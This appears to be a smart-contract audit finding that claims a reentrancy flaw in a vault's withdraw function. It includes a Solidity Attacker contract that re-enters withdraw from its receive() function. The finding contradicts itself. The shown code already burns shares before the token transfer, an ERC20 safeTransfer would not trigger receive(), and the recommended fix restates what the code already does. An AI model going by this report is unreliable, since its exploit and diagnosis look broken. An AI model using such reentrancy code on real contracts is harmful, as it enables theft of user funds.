# Vulnerability details

## Impact
Reentrancy vulnerability in the withdrawal process allows malicious actors to drain funds from the vault. This can lead to significant loss of user funds and compromise the entire system's integrity. Attackers can repeatedly withdraw funds before the contract state is updated, potentially emptying the vault.

## Proof of Concept

```solidity
// In Vault.sol
function withdraw(uint256 assets, address receiver, address owner) public virtual returns (uint256 shares) {
    shares = previewWithdraw(assets);
    if (msg.sender != owner) {
        uint256 allowed = allowance[owner][msg.sender];
        if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;
    }

    beforeWithdraw(assets, shares);

    _burn(owner, shares);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);

    asset.safeTransfer(receiver, assets);  // Vulnerable external call

    afterWithdraw(assets, shares);
}

// Malicious contract
contract Attacker {
    Vault vault;
    
    constructor(address _vault) {
        vault = Vault(_vault);
    }
    
    function attack() external payable {
        vault.deposit{value: msg.value}(address(this));
        vault.withdraw(msg.value, address(this), address(this));
    }
    
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(msg.value, address(this), address(this));
        }
    }
}
```

## Recommended Mitigation Steps
Implement the checks-effects-interactions pattern in the `withdraw` function. Move all state changes before the external call to transfer assets. Consider using a reentrancy guard modifier for additional protection. Ensure that the contract's balance is updated before transferring funds to prevent multiple withdrawals of the same assets.
